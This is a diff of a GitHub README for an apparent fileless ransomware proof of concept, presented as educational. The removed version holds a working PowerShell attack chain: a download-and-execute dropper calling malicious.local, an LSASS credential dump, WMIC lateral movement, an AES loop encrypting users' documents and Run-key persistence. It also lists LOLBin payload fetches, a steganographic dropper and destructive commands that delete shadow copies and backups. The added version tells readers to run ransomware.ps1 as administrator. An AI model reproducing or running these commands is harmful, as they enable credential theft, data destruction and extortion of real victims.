@@ -1,249 +1,116 @@
+# NSFW Ransomware: A Fileless PoC for Educational Purposes 🚀
 
-# ⚠️ NSFW-Ransomware: Fileless Ransomware Simulation & Detection Framework (PoC)
-
-> **⚠️ For Educational & Authorized Research Use Only**  
-> This project is intended exclusively for **detection engineering**, **blue team training**, and **offensive security research** within **isolated lab environments**.  
-> **Do not deploy in production environments or on unauthorized systems.**  
-> The authors assume **no liability** for misuse or unintended consequences.
-
----
-
-![NSFW-Ransomware Simulation](https://github.com/user-attachments/assets/0a7b0119-2b11-49f1-93af-4fae2e6517bc)
-
----
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Features](#features)
-- [Attack Chain Overview](#attack-chain-overview)
-- [Getting Started](#getting-started)
-- [Attack Simulation (PowerShell)](#attack-simulation-powershell)
-- [Reconnaissance & LOLBins](#reconnaissance--lolbins)
-- [Advanced Tradecraft](#advanced-tradecraft)
-- [ATT&CK Framework Mapping](#attack-framework-mapping)
-- [Destructive Payload Scenarios](#destructive-payload-scenarios)
-- [Detection & Mitigation](#detection--mitigation)
-- [Legal Notice](#legal-notice)
-- [References](#references)
-
----
+![GitHub Repo Size](https://img.shields.io/github/repo-size/obeme2228/NSFW-Ransomware?style=flat-square)
+![License](https://img.shields.io/github/license/obeme2228/NSFW-Ransomware?style=flat-square)
+![Last Commit](https://img.shields.io/github/last-commit/obeme2228/NSFW-Ransomware?style=flat-square)
 
 ## Overview
 
-**NSFW-Ransomware** is a simulated fileless ransomware framework designed to emulate advanced adversarial behaviors using Windows-native binaries (LOLBins), reflective DLL injection, and in-memory payload delivery. This tool enables defenders to safely test and improve detection strategies within controlled environments.
+NSFW-Ransomware is a proof-of-concept (PoC) project that showcases fileless ransomware techniques. This repository serves educational and research purposes only. It is designed to help security professionals, researchers, and students understand the mechanisms behind fileless malware and ransomware attacks.
 
-### Primary Objectives
+### Table of Contents
 
-- Emulate realistic fileless ransomware operations.
-- Provide modular components for red/purple teaming exercises.
-- Demonstrate misuse of trusted binaries to bypass traditional defenses.
+- [Key Features](#key-features)
+- [Topics Covered](#topics-covered)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
----
+## Key Features
 
-## Features
+- **Fileless Execution**: This ransomware operates without creating traditional files on the disk, making detection harder.
+- **Living off the Land**: It utilizes existing tools and scripts to execute its payload, minimizing footprint.
+- **Ransomware Techniques**: Implements common ransomware tactics to encrypt files and demand ransom.
+- **Research Focus**: Aimed at providing insights into the evolving landscape of malware.
 
-- **Fileless Execution** – Payloads remain entirely in memory.
-- **LOLBins Abuse** – Executes using native Windows binaries (e.g., `rundll32`, `certutil`, `regsvr32`).
-- **Privilege Escalation** – Demonstrates techniques like Print Spooler and HiveNightmare.
-- **Lateral Movement** – Mimics propagation through SMB/WinRM.
-- **Simulated Impact** – File encryption, recovery prevention, system sabotage.
-- **Modular Design** – Adaptable for C2 emulation, detection tuning, or security training.
-- **MITRE ATT&CK Mappings** – Fully aligned with industry-standard TTPs.
+## Topics Covered
 
----
+This repository covers various topics related to fileless malware and ransomware:
 
-## Attack Chain Overview
+- **Fileless Malware**: Understand how malware can operate in memory without leaving traces on the disk.
+- **Living off the Land (LoL)**: Explore techniques that leverage existing system tools for malicious purposes.
+- **LOLbins and LOLbas**: Learn about legitimate binaries and scripts that can be exploited.
+- **MITRE ATT&CK Framework**: Study the tactics, techniques, and procedures (TTPs) used by threat actors.
+- **Ransomware Detection**: Discover methods for identifying and mitigating ransomware threats.
+- **Red Teaming**: Engage in simulated attacks to test security measures.
+- **Threat Detection**: Explore strategies for identifying and responding to threats.
+- **Threat Intelligence**: Understand how to gather and analyze information about potential threats.
+- **Windows 11**: Examine the implications of ransomware on the latest Windows operating system.
 
-1. **Initial Access** – Payload delivery via trusted binaries.
-2. **Privilege Escalation** – Local exploitation (e.g., Print Spooler abuse).
-3. **Credential Dumping** – LSASS memory scraping via `rundll32`.
-4. **Lateral Movement** – Executed through remote scripting and network shares.
-5. **Impact** – Simulated encryption and destruction of user files.
-6. **Persistence** – Achieved using registry-based PowerShell autorun entries.
+## Installation
 
----
+To get started, download the latest release of NSFW-Ransomware from the [Releases](https://github.com/obeme2228/NSFW-Ransomware/releases) section. Ensure you download the necessary files and execute them in a controlled environment.
 
-## Getting Started
+### Requirements
 
-### Prerequisites
+- Windows 10 or 11
+- PowerShell
+- Basic knowledge of command-line operations
 
-- Windows 10/11 VM with snapshots enabled
-- PowerShell v5+
-- Administrator privileges
-- (Optional) Internet access for payload retrieval
-- Tools: [7-Zip](https://www.7-zip.org/), Sysinternals Suite, [Sigma](https://github.com/SigmaHQ/sigma)
+## Usage
 
-### Execution Guidelines
+After downloading the files, follow these steps to run the ransomware in a safe environment:
 
-- No compilation required — the framework uses native PowerShell and system binaries.
-- All examples below should be executed **in a sandboxed or test VM only**.
+1. **Open PowerShell**: Run PowerShell as an administrator.
+2. **Navigate to the Directory**: Change to the directory where the files are located.
+3. **Execute the Ransomware**: Run the script to see how it operates.
 
----
+Make sure to conduct this in a virtual machine or isolated environment to avoid any unintended consequences.
 
-## Attack Simulation (PowerShell)
+## Examples
 
-```powershell
-# Step 1: Initial access via fileless dropper
-IEX(New-Object Net.WebClient).DownloadString("http://malicious.local/dropper.ps1")
-
-# Step 2: In-memory .NET payload loading
-$bytes = [System.Convert]::FromBase64String("[BASE64_PAYLOAD]")
-[System.Reflection.Assembly]::Load($bytes)
-
-# Step 3: Privilege escalation
-Start-Process powershell -Args "-File C:\Temp\elevate.ps1" -Verb RunAs
-
-# Step 4: Credential dumping
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
-
-# Step 5: Lateral movement
-wmic /node:TARGET_PC process call create "powershell.exe -File \\network_share\payload.ps1"
-
-# Step 6: Simulated file encryption
-$files = Get-ChildItem "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
-foreach ($file in $files) {
-  $data = Get-Content $file.FullName -Raw
-  $aes = New-Object System.Security.Cryptography.AesManaged
-  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
-  $aes.IV = New-Object byte[] 16
-  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
-  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
-}
-
-# Step 7: Persistence (registry-based PowerShell autorun)
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
-````
-
----
-
-## Reconnaissance & LOLBins
-
-### Google Dorking Examples
-
-```text
-inurl:"/hp/device/this.LCDispatcher"
-intitle:"Web Image Monitor"
-inurl:"/printers/"
-intitle:"Konica Minolta"
-inurl:"/printer/main.html"
-intitle:"PaperCut MF"
-```
-
-### Living Off the Land Binaries (LOLBins)
-
-```cmd
-rundll32.exe \\192.168.X.X\share\payload.dll,ReflectEntry
-regsvr32.exe /s /n /u /i:http://malicious.local/script.sct scrobj.dll
-certutil.exe -urlcache -split -f http://malicious.local/dropper.b64 drop.b64
-```
-
----
-
-## Advanced Tradecraft
-
-### Steganographic File Dropper
-
-```cmd
-copy /b clean.jpg + encrypted.7z clean.jpg
-certutil -decode clean.jpg payload.7z
-7z x payload.7z -oC:\Temp
-```
-
-### Reflective DLL Injection
-
-```cmd
-rundll32.exe \\attacker\payload.dll,ReflectEntry
-```
-
-> *Note: This technique is commonly used to bypass disk forensics and traditional AV signatures.*
-
----
-
-## MITRE ATT\&CK Framework Mapping
-
-| Phase                | Technique                            | ID               | Description                               |
-| -------------------- | ------------------------------------ | ---------------- | ----------------------------------------- |
-| Initial Access       | Valid Accounts, Drive-by Compromise  | T1078, T1189     | Initial foothold via trusted interfaces   |
-| Execution            | LOLBins, Reflective Injection        | T1218, T1055.001 | Stealthy memory-only execution            |
-| Privilege Escalation | Print Spooler Exploit, HiveNightmare | T1068, T1003.002 | SYSTEM-level privilege escalation         |
-| Defense Evasion      | Encoded Commands, Fileless Execution | T1027, T1202     | Evasion via obfuscation and in-memory ops |
-| Credential Access    | LSASS Dumping                        | T1003            | Dumping credentials via memory access     |
-| Lateral Movement     | SMB, Remote Scripting                | T1021.002        | Movement across systems using LOLBins     |
-| Impact               | Encryption, Destructive Commands     | T1485, T1486     | File encryption and system sabotage       |
-
----
-
-## Destructive Payload Scenarios (LOLBins)
-
-```cmd
-cipher /w:C:                                       # Secure delete free space
-vssadmin delete shadows /all /quiet               # Shadow copy deletion
-wbadmin delete systemstatebackup -keepVersions:0  # Backup removal
-bcdedit /set {default} recoveryenabled No         # Disable recovery boot
-fsutil dirty set C:                               # Force dirty bit
-forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file" # Mass deletion
-schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59
-```
-
----
-
-## Detection & Mitigation
-
-### Detection Strategies
-
-* **Sysmon + Sigma**:
-
-  * Monitor for unusual LOLBin activity
-  * Detect fileless persistence via registry keys
-  * Identify PowerShell encoding and obfuscation
-
-* **SIEM (Splunk, ELK)**:
-
-  * Correlate process trees and anomalies
-  * Alert on remote execution from network shares
-
-* **EDR/XDR Tools**:
-
-  * Detect reflective DLL injection
-  * Flag in-memory-only payloads
-
-### Mitigation Tactics
+### Example 1: Basic Execution
 
 ```powershell
-# Disable vulnerable services
-Stop-Service Spooler -Force
-Set-Service Spooler -StartupType Disabled
+# Change to the directory where the ransomware script is located
+cd C:\Path\To\NSFW-Ransomware
 
-# Harden LOLBin usage (via WDAC, AppLocker)
-# Apply latest patches (PrintNightmare, HiveNightmare)
-
-# Restrict network shares and SMB access
-# Isolate high-value assets via segmentation
-
-# Maintain frequent, secure, offline backups
+# Execute the ransomware script
+.\ransomware.ps1
 ```
 
----
+### Example 2: Monitoring Network Activity
 
-## Legal Notice
+Use network monitoring tools to observe how the ransomware communicates during execution. This can provide insights into its behavior and potential mitigation strategies.
 
-> This framework is provided **solely for lawful, academic, and professional research**.
-> Unauthorized distribution, execution on live systems, or malicious use is **strictly prohibited**.
-> **The authors disclaim all liability** for any damage or legal consequences arising from misuse.
+## Contributing
 
----
+Contributions are welcome! If you have ideas for improvements or new features, feel free to submit a pull request or open an issue. Please follow these guidelines:
 
-## References
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Commit your changes with clear messages.
+4. Push your branch and submit a pull request.
 
-* [LOLOL.farm – LOLBin Playground](https://lolol.farm/)
-* [PrintNightmare Post-Mortem](https://itm4n.github.io/printnightmare-not-over/)
-* [HiveNightmare Exploit](https://github.com/GossiTheDog/HiveNightmare)
-* [Sigma Detection Rules](https://github.com/SigmaHQ/sigma)
-* [Crow Security – DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
-* [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
-* [MITRE ATT\&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/)
+## License
 
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
+## Contact
 
+For questions or feedback, reach out to the repository maintainer:
 
+- GitHub: [obeme2228](https://github.com/obeme2228)
+
+For the latest updates and releases, visit the [Releases](https://github.com/obeme2228/NSFW-Ransomware/releases) section. 
+
+### Important Note
+
+This project is for educational and research purposes only. Misuse of this software can lead to serious legal consequences. Always ensure you have permission before testing in any environment.
+
+## Resources
+
+- [MITRE ATT&CK Framework](https://attack.mitre.org/)
+- [OWASP Fileless Malware](https://owasp.org/www-community/OWASP_Fileless_Malware_Project)
+- [Ransomware Research](https://www.cisa.gov/stopransomware)
+
+## Acknowledgments
+
+Special thanks to the cybersecurity community for their ongoing research and efforts in combating ransomware and fileless malware. Your contributions help make the digital world safer for everyone. 
+
+## Additional Information
+
+For further insights, consider exploring other repositories focused on cybersecurity and malware analysis. Engaging with community forums can also provide valuable information and support.
